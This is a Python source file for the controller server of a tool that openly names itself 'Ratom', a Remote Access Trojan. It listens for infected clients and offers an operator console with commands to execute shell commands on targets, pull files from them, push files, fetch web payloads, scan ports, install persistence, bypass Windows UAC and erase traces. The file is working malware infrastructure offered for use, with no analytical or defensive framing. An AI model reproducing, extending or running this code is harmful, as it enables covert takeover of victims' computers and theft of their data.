# -*- coding: UTF-8 -*-
import argparse
import readline
import socket
import sys
import threading
import time
import os

from src import common
from src import crypto

BANNER = '''
\033[1;36m

         ______          ___    ___________   ______    ___  ___  
        |   _  \        /   \  |           | /  __  \  |   \/   | 
        |  |_)  |      /  ^  \ `---|  |----`|  |  |  | |  \  /  | 
        |      /      /  /_\  \    |  |     |  |  |  | |  |\/|  | 
        |  |\  \----./  _____  \   |  |     |  `--'  | |  |  |  | 
        | _| `._____/__/     \__\  |__|      \______/  |__|  |__| 

            A RAT(Remote Access Trojan) which is like an atom.
                        (In fact, it is not :)

\033[0m                                       
'''

HELP_TEXT = '''
help                - Show help information.
list                - List alive clients.
connect <id>        - Connect to a client.
kill                - Kill current client connection.
cmd <command>       - Execute a command on target.
scan                - Scan top 25 ports of target's host.
persistence         - Apply persistence mechanism.
bypass              - Bypass UAC on target.
sacrifice           - \033[1;31mDangerous:\033[0m remove all traces of the Ratom from target.
info                - Basic information of target's system.
unzip <file>        - Unzip a file.
download <file>     - Download a file from target.
upload <file>       - Upload a file to target.
wget <url>          - Download a file from web.
banner              - Show banner again.
clear               - Clear the screen.
exit                - Exit the server and end all client connections.
'''

COMMANDS = [ 'connect', 'list', 'download', 'cmd', 'help', 'kill',
             'persistence', 'exit', 'scan', 'sacrifice', 'bypass', 'info',
             'unzip', 'upload', 'wget', 'banner', 'clear']

class Server(threading.Thread):
    clients = {}
    alive = True
    client_count = 1

    def __init__(self, port):
        super(Server, self).__init__()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            conn, addr = self.s.accept()
            client_id = self.client_count
            client = ClientConnection(conn, addr, uid=client_id)
            self.clients[client_id] = client
            self.client_count += 1

    def select_client(self, client_id):
        try:
            return self.clients[int(client_id)]
        except (KeyError, ValueError):
            return None

    def get_clients(self):
        return [v for k,v in self.clients.iteritems() if v.alive]

    def remove_client(self, key):
        return self.clients.pop(key, None)


class ClientConnection(common.Client):
    alive = True

    def send(self, prompt):
        if not self.alive:
            print('Error: Client not connected.')
            return

        cmd, _, action = prompt.partition(' ')

        # 自毁
        if cmd == 'sacrifice':
            if raw_input("\033[1;31mDangerous:\033[0m remove all traces of Ratom from target (y/N)? ").startswith('y'):
                print('Sacrificing...')
                self.sendGCM(prompt)
                self.conn.close()
            return

        # 向指定客户端发送命令
        self.sendGCM(prompt)
        self.conn.settimeout(1)

        # 关闭与指定客户端的连接
        if cmd == 'kill':
            self.conn.close()

        # 从指定客户端下载文件
        elif cmd == 'download':
            self.recvfile(action.rstrip())

        # 给指定客户端上传文件
        elif cmd == 'upload':
            self.sendfile(action.rstrip())

        # cmd, persistence, bypass, scan, info, unzip, wget 的返回结果
        elif cmd in ['cmd', 'persistence', 'bypass', 'scan', 'info', 'unzip', 'wget']:
            print('Running {}...'.format(cmd))
            recv_data = self.recvGCM().rstrip()


def get_parser():
    parser = argparse.ArgumentParser(description='Ratom Server')
    parser.add_argument('-p', '--port', help = 'Port to listen on.', default = 1335, type = int)
    return parser


def print_banner():
    for line in BANNER.split('\n'):
        time.sleep(0.05)
        print(line)


def main():
    parser  = get_parser()
    args    = vars(parser.parse_args())
    port    = args['port']
    client  = None

    print_banner()

    # 服务端开始运行
    server = Server(port)
    server.setDaemon(True)
    server.start()
    print('Ratom server is listening for connections on port {}.'.format(port))

    while True:
        try:
            promptstr = '\n\033[1;36m[{}] Ratom>\033[0m '.format(client.uid)
        except AttributeError:
            promptstr = '\n\033[1;36m[{}] Ratom>\033[0m '.format('?')

        # 无视输入末尾的空格
        prompt = raw_input(promptstr).rstrip()

        # 空命令
        if not prompt:
            continue

        cmd, _, action = prompt.partition(' ')

        if cmd not in COMMANDS:
            print('Invalid command, type "help" to see a list of commands.')
            continue


        if cmd == 'help':
            print(HELP_TEXT)

        elif cmd == 'banner':
            print_banner()

        elif cmd == 'clear':
            plat = sys.platform
            # Windows 清屏
            if plat.startswith('win'):
                os.system('cls')
            # OSX / Linux 清屏
            else:
                os.system('clear')

        # 服务端停止
        elif cmd == 'exit':
            if raw_input('Exit the server and end all client connections ' \
                         '(y/N)? ').startswith('y'):
                # 切断与所有客户端的连接
                sys.exit(0)

        # 与指定客户端连接
        elif cmd == 'connect':
            new_client = server.select_client(action)
            if new_client:
                client = new_client
                print('Client {} selected.'.format(client.uid))
            else:
                print('Error: Invalid Client ID')

        # 列出所有客户端 ID 和 ip
        elif cmd == 'list':
            print('ID - Client Address')
            for k in server.get_clients():
                print('{:>2} - {}'.format(k.uid, k.addr[0]))

        # 不需要连接客户端的命令
        if cmd in ['connect', 'list', 'help', 'banner', 'clear', 'exit']:
            continue

        # 未连接客户端就执行了连接客户端后才能执行的命令
        if not client:
            print('You have not connected to any client.')
            continue

        # 向指定客户端发送命令
        try:
            client.send(prompt)
        except (socket.error, ValueError) as e:
            # 客户端挂了
            print(e)
            print('Client {} disconnected.'.format(client.uid))
            cmd = 'kill'

        # 移除挂掉的客户端
        if cmd in ['kill', 'sacrifice']:
            server.remove_client(client.uid)
            client = None


if __name__ == '__main__':
    main()